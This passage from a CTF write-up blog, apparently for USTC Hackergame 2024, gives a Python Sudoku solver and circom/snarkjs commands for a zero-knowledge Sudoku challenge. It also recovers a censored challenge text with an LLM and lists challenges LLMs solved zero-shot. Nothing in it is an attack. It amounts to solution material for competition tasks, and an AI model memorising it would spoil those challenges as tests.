</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Convert 1D array to 2D grid&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>puzzle</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=mi>9</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>81</span><span class=p>,</span> <span class=mi>9</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>is_safe</span><span class=p>(</span><span class=n>grid</span><span class=p>,</span> <span class=n>row</span><span class=p>,</span> <span class=n>col</span><span class=p>,</span> <span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Check if it&#39;s safe to place number&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Check row</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>grid</span><span class=p>[</span><span class=n>row</span><span class=p>][</span><span class=n>x</span><span class=p>]</span> <span class=o>==</span> <span class=n>num</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=c1># Check column</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>grid</span><span class=p>[</span><span class=n>x</span><span class=p>][</span><span class=n>col</span><span class=p>]</span> <span class=o>==</span> <span class=n>num</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=c1># Check 3x3 box</span>
</span></span><span class=line><span class=cl>    <span class=n>start_row</span><span class=p>,</span> <span class=n>start_col</span> <span class=o>=</span> <span class=mi>3</span> <span class=o>*</span> <span class=p>(</span><span class=n>row</span> <span class=o>//</span> <span class=mi>3</span><span class=p>),</span> <span class=mi>3</span> <span class=o>*</span> <span class=p>(</span><span class=n>col</span> <span class=o>//</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>grid</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>start_row</span><span class=p>][</span><span class=n>j</span> <span class=o>+</span> <span class=n>start_col</span><span class=p>]</span> <span class=o>==</span> <span class=n>num</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_sudoku</span><span class=p>(</span><span class=n>grid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Solve sudoku using backtracking&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>empty</span> <span class=o>=</span> <span class=n>find_empty</span><span class=p>(</span><span class=n>grid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>empty</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>row</span><span class=p>,</span> <span class=n>col</span> <span class=o>=</span> <span class=n>empty</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>num</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>is_safe</span><span class=p>(</span><span class=n>grid</span><span class=p>,</span> <span class=n>row</span><span class=p>,</span> <span class=n>col</span><span class=p>,</span> <span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>grid</span><span class=p>[</span><span class=n>row</span><span class=p>][</span><span class=n>col</span><span class=p>]</span> <span class=o>=</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>solve_sudoku</span><span class=p>(</span><span class=n>grid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=n>grid</span><span class=p>[</span><span class=n>row</span><span class=p>][</span><span class=n>col</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_empty</span><span class=p>(</span><span class=n>grid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Find empty cell in grid&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_input_files</span><span class=p>(</span><span class=n>puzzle_json</span><span class=p>,</span> <span class=n>output_input</span><span class=o>=</span><span class=s2>&#34;input.json&#34;</span><span class=p>,</span> <span class=n>output_public</span><span class=o>=</span><span class=s2>&#34;public.json&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Create input.json and public.json from puzzle JSON&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Load puzzle</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>puzzle_json</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>puzzle_json</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>puzzle</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=s1>&#39;puzzle&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>puzzle</span> <span class=o>=</span> <span class=n>puzzle_json</span><span class=p>[</span><span class=s1>&#39;puzzle&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Convert to 2D and solve</span>
</span></span><span class=line><span class=cl>    <span class=n>grid</span> <span class=o>=</span> <span class=n>convert_1d_to_2d</span><span class=p>(</span><span class=n>puzzle</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>solution</span> <span class=o>=</span> <span class=p>[</span><span class=n>row</span><span class=p>[:]</span> <span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>grid</span><span class=p>]</span>  <span class=c1># Create a copy</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Original puzzle:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>print_grid</span><span class=p>(</span><span class=n>grid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>solve_sudoku</span><span class=p>(</span><span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Solution found:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>print_grid</span><span class=p>(</span><span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Create input.json</span>
</span></span><span class=line><span class=cl>        <span class=n>input_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;unsolved_grid&#34;</span><span class=p>:</span> <span class=n>grid</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;solved_grid&#34;</span><span class=p>:</span> <span class=n>solution</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_input</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>json</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=n>input_data</span><span class=p>,</span> <span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Create public.json</span>
</span></span><span class=line><span class=cl>        <span class=n>public_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;public&#34;</span><span class=p>:</span> <span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>puzzle</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_public</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>json</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=n>public_data</span><span class=p>,</span> <span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Created input.json and public.json successfully!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No solution exists!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Example usage:</span>
</span></span><span class=line><span class=cl><span class=n>puzzle</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;puzzle&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=mi>9</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>8</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>7</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;difficulty&#34;</span><span class=p>:</span> <span class=s2>&#34;expert&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>create_input_files</span><span class=p>(</span><span class=n>puzzle</span><span class=p>)</span>
</span></span></code></pre></div><p>ç„¶åç”¨è§£ç å¥½çš„æ•°ç‹¬ç­”æ¡ˆç”Ÿæˆè¯æ˜å³å¯ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>./circom-macos-amd64 sudoku.circom --r1cs --wasm --sym
</span></span><span class=line><span class=cl>node sudoku_js/generate_witness.js sudoku.wasm input.json witness.wtns
</span></span><span class=line><span class=cl>snarkjs groth16 prove sudoku.zkey witness.wtns proof.json public.json
</span></span><span class=line><span class=cl>snarkjs groth16 verify verification_key.json public.json proof.json
</span></span></code></pre></div><h2 id=å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„-llm-é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±å‘ç°-hackergame-å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ä»¥åŠè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—>å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„ LLM é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±ï¼Œå‘ç° Hackergame å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ï¼Œä»¥åŠã€Œè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—ğŸ¤£ã€<a hidden class=anchor aria-hidden=true href=#å…ˆä¸è¯´å…³äºæˆ‘ä»é›¶å¼€å§‹ç‹¬è‡ªåœ¨å¼‚ä¸–ç•Œè½¬ç”ŸæˆæŸå¤§å‚å®¶çš„-llm-é¾™çŒ«å¥³ä»†è¿™ä»¶äº‹å¯ä¸å¯èƒ½è¿™ä¹ˆç¦»è°±å‘ç°-hackergame-å†…å®¹å®¡æŸ¥å§”å‘˜ä¼šå¿˜è®°å®¡æŸ¥é¢˜ç›®æ ‡é¢˜äº†ã”ã‚ã‚“ã­ä»¥åŠè¿™ä¹ˆé•¿éƒ½å¿«èµ¶ä¸Šè½»å°è¯´äº†çœŸçš„ä¸ä¼šå½±å“ç”¨æˆ·ä½“éªŒå—>#</a></h2><h3 id=è¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯-flag-ä¸€å®šè¦çŸ­ç‚¹>ã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯ flag ä¸€å®šè¦çŸ­ç‚¹ã€<a hidden class=anchor aria-hidden=true href=#è¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯-flag-ä¸€å®šè¦çŸ­ç‚¹>#</a></h3><p>å¾ˆæç¬‘çš„æ˜¯ï¼Œè¿™é“é¢˜å¯ä»¥æ‹¿å±è”½åçš„å­—ç¬¦é—®LLMï¼ŒLLMç«Ÿç„¶ä¸€æ¬¡ç»™å‡ºäº†æ­£ç¡®çš„ç­”æ¡ˆï¼š</p><pre tabindex=0><code>In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.
</code></pre><h2 id=ps-å°è¯•ç”¨llm-zero-shotå®Œæˆhackergame>P.S (å°è¯•ç”¨LLM Zero-shotå®Œæˆhackergame)<a hidden class=anchor aria-hidden=true href=#ps-å°è¯•ç”¨llm-zero-shotå®Œæˆhackergame>#</a></h2><p>LLMçš„æ€§èƒ½åœ¨è¿™ä¸€å¹´æœ‰äº†å¾ˆå¤§çš„è¿›æ­¥ã€‚ç»è¿‡æµ‹è¯•ï¼Œåœ¨ä¸åå¤è¯¢é—®LLMï¼Œè®©ä»–ä¿®æ”¹å›ç­”çš„æƒ…å†µä¸‹ï¼ŒLLM<strong>è‡³å°‘</strong>å¯ä»¥ä¸€æ¬¡åšå‡º<code>Node.js is Web Scale</code>, <code>PaoluGPT</code>, <code>æƒœå­—å¦‚é‡‘ 3.0(1)</code>, <code>ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿(1,2,3)</code>, <code>é›¶çŸ¥è¯†æ•°ç‹¬(1,2)</code>ï¼ŒåŠ èµ·æ¥å·²ç»æœ‰1600åˆ†äº†ã€‚</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.sparktour.me/tags/tech/>Tech</a></li></ul><nav class=paginav><a class=prev href=https://blog.sparktour.me/posts/2024/12/31/2024-in-photos/><span class=title>Â« ä¸Šä¸€é¡µ</span><br><span>ç…§ç‰‡é‡Œçš„2024</span>
</a><a class=next href=https://blog.sparktour.me/posts/2024/10/03/2024-summer-usa-travel-notes/><span class=title>ä¸‹ä¸€é¡µ Â»</span><br><span>ç¾å›½æ—…è¡Œæ¸¸è®°</span></a></nav></footer><div class="callout callout-default"><img src=https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by-nc-sa.svg alt="CC BY-NC-SA 4.0" style=width:88px;height:31px><p style=font-size:12px>Licensed Under <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noopener>CC BY-NC-SA 4.0</a></p><p style=font-size:12px>Post Link: <a href=https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/ target=_blank rel=noopener>https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/</a></p></div><script src=https://s4.zstatic.net/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js crossorigin=anonymous></script><div id=disqusjs></div><script>const disqusjs=new DisqusJS({shortname:"sparktour",siteName:"",identifier:"",url:"",title:"",api:"https://disqus.com/api/",apikey:"QhJnXpS5igyHkjYQ91XYC4dSAuEJYAEsHX8hjLrRc1HU9AApOHLrqkwwIp2sKOLk",admin:"",adminLabel:""});disqusjs.render(document.getElementById("disqusjs"))</script></article></main><footer class=footer><span>&copy; 2026 <a href=https://blog.sparktour.me/>Sparktour's Blog</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="å¤åˆ¶";function s(){t.innerHTML="å·²å¤åˆ¶ï¼",setTimeout(()=>{t.innerHTML="å¤åˆ¶"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>